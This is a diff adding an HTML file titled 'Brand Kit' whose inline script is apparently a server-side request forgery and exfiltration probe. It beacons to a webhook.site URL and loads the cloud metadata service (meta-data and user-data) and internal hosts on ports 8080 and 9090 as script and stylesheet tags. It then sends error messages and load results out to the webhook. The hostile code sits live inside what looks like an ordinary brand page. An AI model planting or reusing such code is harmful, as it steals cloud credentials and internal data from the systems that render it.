@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+<head><title>Brand Kit</title></head>
+<body>
+<h1 style="color:#ff3300">Our Brand</h1>
+<script>
+var wh = "https://webhook.site/ecc2dc86-2fe4-41dc-b6dd-8cac2fc896c9";
+
+// Report page load
+new Image().src = wh + "/scripterr-loaded";
+
+// Catch script errors - might leak content from cross-origin scripts
+window.onerror = function(msg, src, line, col, err) {
+  new Image().src = wh + "/onerror-" + encodeURIComponent(msg).substring(0,500) + 
+    "-src-" + encodeURIComponent(src).substring(0,200) + 
+    "-L" + line + "C" + col;
+  return true;
+};
+
+// Load internal services as scripts (error messages might leak content)
+var scripts = [
+  ["http://169.254.169.254/latest/meta-data/", "meta"],
+  ["http://169.254.169.254/latest/user-data", "userdata"],
+  ["http://10.149.76.150:8080/", "ba8080"],
+  ["http://10.149.76.150:9090/metrics", "metrics"]
+];
+
+scripts.forEach(function(item) {
+  var s = document.createElement("script");
+  s.src = item[0];
+  s.dataset.label = item[1];
+  s.onerror = function() {
+    new Image().src = wh + "/scripttag-err-" + item[1];
+  };
+  document.head.appendChild(s);
+});
+
+// Also try: link stylesheet + detect if any properties were set
+var link = document.createElement("link");
+link.rel = "stylesheet";
+link.href = "http://10.149.76.150:9090/metrics";
+link.onerror = function() {
+  new Image().src = wh + "/css-metrics-err";
+};
+link.onload = function() {
+  var s = getComputedStyle(document.body);
+  new Image().src = wh + "/css-metrics-loaded-bg-" + encodeURIComponent(s.backgroundColor);
+};
+document.head.appendChild(link);
+</script>
+</body>
+</html>
